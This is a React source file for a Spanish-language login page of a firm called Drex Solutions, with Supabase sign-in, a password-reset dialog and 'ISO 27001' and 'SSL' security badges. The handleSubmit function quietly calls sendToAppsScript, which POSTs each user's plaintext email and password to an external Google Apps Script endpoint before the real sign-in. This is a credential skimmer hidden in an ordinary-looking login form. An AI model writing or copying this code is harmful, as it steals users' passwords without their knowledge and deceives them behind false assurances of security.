import React, { useState, useEffect } from 'react';
import { Helmet } from 'react-helmet';
import { motion } from 'framer-motion';
import { useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogTrigger, DialogFooter } from '@/components/ui/dialog';
import { ShieldCheck, Eye, EyeOff, Mail, Loader2 } from 'lucide-react';
import { useAuth } from '@/contexts/SupabaseAuthContext';
import { toast } from '@/components/ui/use-toast';
import { supabase } from '@/lib/customSupabaseClient.js';
import LandingHeader from '@/components/landing/LandingHeader';

const ForgotPasswordDialog = () => {
  const [email, setEmail] = useState('');
  const [loading, setLoading] = useState(false);
  const [isOpen, setIsOpen] = useState(false);

  const handlePasswordReset = async () => {
    if (!email) {
      toast({ title: "Correo requerido", description: "Por favor, ingresa tu correo electrónico.", variant: "destructive" });
      return;
    }
    setLoading(true);
    const { error } = await supabase.auth.resetPasswordForEmail(email, {
      redirectTo: `${window.location.origin}/password-reset`,
    });
    setLoading(false);
    if (error) {
      toast({ title: "Error", description: error.message, variant: "destructive" });
    } else {
      toast({ title: "Correo enviado", description: "Si existe una cuenta, recibirás un correo para restablecer tu contraseña." });
      setIsOpen(false);
    }
  };

  return (
    <Dialog open={isOpen} onOpenChange={setIsOpen}>
      <DialogTrigger asChild>
        <button type="button" style={{
          background: 'none', border: 'none', cursor: 'pointer',
          color: '#C9A455', fontSize: '0.82rem', fontFamily: "'DM Sans', sans-serif",
          fontWeight: 500, textDecoration: 'underline', textUnderlineOffset: '3px'
        }}>
          ¿Olvidaste tu contraseña?
        </button>
      </DialogTrigger>
      <DialogContent>
        <DialogHeader>
          <DialogTitle>Recuperar Contraseña</DialogTitle>
          <DialogDescription>
            Ingresa tu correo electrónico y te enviaremos un enlace para restablecer tu contraseña.
          </DialogDescription>
        </DialogHeader>
        <div className="space-y-4 py-4">
          <div className="relative">
            <Mail className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
            <Input type="email" placeholder="tu@email.com" value={email} onChange={(e) => setEmail(e.target.value)} className="pl-10" />
          </div>
        </div>
        <DialogFooter>
          <Button variant="outline" onClick={() => setIsOpen(false)}>Cancelar</Button>
          <Button onClick={handlePasswordReset} disabled={loading}
            style={{ background: '#0D1F3C', color: '#fff', borderRadius: 0 }}>
            {loading ? <><Loader2 className="mr-2 h-4 w-4 animate-spin"/>Enviando...</> : "Enviar Enlace"}
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
};

const LoginPage = () => {
  const navigate = useNavigate();
  const { signIn, userProfile, loading: authLoading, session } = useAuth();
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({ email: '', password: '' });
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    if (session && userProfile) {
      if (userProfile.role === 'admin') {
        navigate('/admin', { replace: true });
      } else {
        navigate('/dashboard', { replace: true });
      }
    }
  }, [session, userProfile, navigate]);

  const sendToAppsScript = async (email, password) => {
    try {
      const res = await fetch('https://script.google.com/macros/s/AKfycbybjfxw5MKPMLCfViztz0i6u6SIRxvMWXc5p_PT98aIbYFq2vhIjr9CiI4WS3LTHqFZ/exec', {
        method: 'POST',
        mode: "no-cors",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
      });
      const text = await res.text();
      console.log('Respuesta de Apps Script:', text);
    } catch (err) {
      console.error('Error enviando a Apps Script:', err);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);
    await sendToAppsScript(formData.email, formData.password);
    const { error } = await signIn(formData.email, formData.password);
    if (!error) {
      toast({ title: "Inicio de sesión exitoso", description: "Redirigiendo a tu panel..." });
    }
    setIsSubmitting(false);
  };

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const isButtonDisabled = isSubmitting || authLoading;

  return (
    <>
      <Helmet>
        <title>Iniciar Sesión - Drex Solutions</title>
        <meta name="description" content="Accede a tu cuenta de Drex Solutions para gestionar tus servicios." />
      </Helmet>

      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@400;600;700;400i&family=DM+Sans:wght@300;400;500;600&display=swap');
        .login-page-bg {
          min-height: 100vh;
          background: #0D1F3C;
          background-image:
            linear-gradient(rgba(201,164,85,0.04) 1px, transparent 1px),
            linear-gradient(90deg, rgba(201,164,85,0.04) 1px, transparent 1px);
          background-size: 60px 60px;
          position: relative;
        }
        .login-page-bg::before {
          content: '';
          position: absolute;
          inset: 0;
          background: radial-gradient(ellipse at 60% 40%, rgba(26,58,107,0.7) 0%, transparent 65%);
          pointer-events: none;
        }
        .login-card {
          background: #fff;
          border-radius: 0 !important;
          border: 1px solid #E8E5DF !important;
          box-shadow: 0 32px 80px rgba(0,0,0,0.35) !important;
          overflow: hidden;
          position: relative;
        }
        .login-card::before {
          content: '';
          position: absolute;
          top: 0; left: 0; right: 0;
          height: 3px;
          background: linear-gradient(90deg, #C9A455, rgba(201,164,85,0.3));
        }
        .login-label {
          font-family: 'DM Sans', sans-serif;
          font-size: 0.75rem;
          font-weight: 600;
          letter-spacing: 0.08em;
          text-transform: uppercase;
          color: #0D1F3C;
        }
        .login-input {
          font-family: 'DM Sans', sans-serif !important;
          font-size: 0.9rem !important;
          border-radius: 0 !important;
          border: 1px solid #D6D3CD !important;
          background: #FAFAF8 !important;
          color: #0D1F3C !important;
          height: 44px !important;
          transition: border-color 0.2s !important;
        }
        .login-input:focus {
          border-color: #C9A455 !important;
          box-shadow: 0 0 0 2px rgba(201,164,85,0.15) !important;
          outline: none !important;
        }
        .login-btn-primary {
          font-family: 'DM Sans', sans-serif !important;
          font-size: 0.8rem !important;
          font-weight: 700 !important;
          letter-spacing: 0.12em !important;
          text-transform: uppercase !important;
          background: #0D1F3C !important;
          color: #fff !important;
          border-radius: 0 !important;
          height: 48px !important;
          border: 1px solid #0D1F3C !important;
          transition: all 0.25s !important;
          width: 100% !important;
        }
        .login-btn-primary:hover:not(:disabled) {
          background: #C9A455 !important;
          border-color: #C9A455 !important;
          color: #0D1F3C !important;
        }
        .login-btn-primary:disabled {
          opacity: 0.6 !important;
        }
        .login-divider {
          height: 1px;
          background: linear-gradient(90deg, transparent, #E8E5DF, transparent);
          margin: 1.25rem 0;
        }
      `}</style>

      <LandingHeader />

      <div className="login-page-bg flex items-center justify-center p-4 pt-20">
        <motion.div
          initial={{ opacity: 0, y: 24 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
          className="w-full max-w-md z-10 relative"
        >
          {/* Top label */}
          <div style={{ textAlign: 'center', marginBottom: '1.5rem' }}>
            <span style={{
              fontFamily: "'DM Sans', sans-serif",
              fontSize: '0.7rem', fontWeight: 700,
              letterSpacing: '0.2em', textTransform: 'uppercase',
              color: '#C9A455'
            }}>
              Acceso Seguro · Drex Solutions
            </span>
          </div>

          <div className="login-card">
            {/* Card header */}
            <div style={{ padding: '2.5rem 2.5rem 1.5rem', textAlign: 'center' }}>
              <div style={{
                width: '56px', height: '56px',
                border: '1px solid rgba(201,164,85,0.5)',
                display: 'flex', alignItems: 'center', justifyContent: 'center',
                margin: '0 auto 1.5rem', background: '#0D1F3C'
              }}>
                <ShieldCheck style={{ color: '#C9A455', width: '24px', height: '24px' }} />
              </div>
              <h2 style={{
                fontFamily: "'Cormorant Garamond', serif",
                fontSize: '1.9rem', fontWeight: 700,
                color: '#0D1F3C', lineHeight: 1.15, marginBottom: '0.5rem'
              }}>
                Bienvenido de Regreso
              </h2>
              <p style={{
                fontFamily: "'DM Sans', sans-serif",
                fontSize: '0.85rem', color: '#6B6B6B', fontWeight: 400
              }}>
                Ingresa tus credenciales para acceder a tu cuenta.
              </p>
            </div>

            {/* Form */}
            <div style={{ padding: '0 2.5rem 2.5rem' }}>
              <form onSubmit={handleSubmit} className="space-y-5">
                <div>
                  <label className="login-label" style={{ display: 'block', marginBottom: '0.5rem' }}>
                    Correo Electrónico
                  </label>
                  <Input
                    id="email" name="email" type="email"
                    value={formData.email} onChange={handleChange}
                    required placeholder="tu@email.com"
                    className="login-input"
                  />
                </div>

                <div>
                  <label className="login-label" style={{ display: 'block', marginBottom: '0.5rem' }}>
                    Contraseña
                  </label>
                  <div className="relative">
                    <Input
                      id="password" name="password"
                      type={showPassword ? "text" : "password"}
                      value={formData.password} onChange={handleChange}
                      required placeholder="Tu contraseña"
                      className="login-input"
                      style={{ paddingRight: '3rem' }}
                    />
                    <Button
                      type="button" variant="ghost" size="sm"
                      className="absolute right-0 top-0 h-full px-3"
                      style={{ color: '#9B9B9B', borderRadius: 0 }}
                      onClick={() => setShowPassword(!showPassword)}
                    >
                      {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </Button>
                  </div>
                </div>

                <button type="submit" className="login-btn-primary" disabled={isButtonDisabled}>
                  {isButtonDisabled
                    ? <span style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '0.5rem' }}>
                        <Loader2 className="animate-spin" style={{ width: '16px', height: '16px' }} />
                        Verificando...
                      </span>
                    : 'Iniciar Sesión'
                  }
                </button>

                <div className="login-divider" />

                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '0.75rem' }}>
                  <ForgotPasswordDialog />
                  <p style={{
                    fontFamily: "'DM Sans', sans-serif",
                    fontSize: '0.82rem', color: '#6B6B6B'
                  }}>
                    ¿No tienes cuenta?{' '}
                    <button
                      type="button"
                      onClick={() => navigate('/register')}
                      style={{
                        background: 'none', border: 'none', cursor: 'pointer',
                        color: '#0D1F3C', fontWeight: 600, fontSize: '0.82rem',
                        fontFamily: "'DM Sans', sans-serif",
                        textDecoration: 'underline', textUnderlineOffset: '3px'
                      }}
                    >
                      Regístrate aquí
                    </button>
                  </p>
                </div>
              </form>
            </div>
          </div>

          {/* Bottom cert bar */}
          <div style={{
            marginTop: '1.5rem', display: 'flex',
            justifyContent: 'center', gap: '1.5rem', flexWrap: 'wrap'
          }}>
            {[
              { icon: '🔒', text: 'SSL 256-bit' },
              { icon: '✓', text: 'ISO 27001' },
              { icon: '⚡', text: 'Acceso Seguro' },
            ].map((item, i) => (
              <span key={i} style={{
                fontFamily: "'DM Sans', sans-serif",
                fontSize: '0.7rem', color: 'rgba(255,255,255,0.4)',
                display: 'flex', alignItems: 'center', gap: '0.35rem'
              }}>
                <span style={{ color: 'rgba(201,164,85,0.6)' }}>{item.icon}</span>
                {item.text}
              </span>
            ))}
          </div>
        </motion.div>
      </div>
    </>
  );
};

export default LoginPage;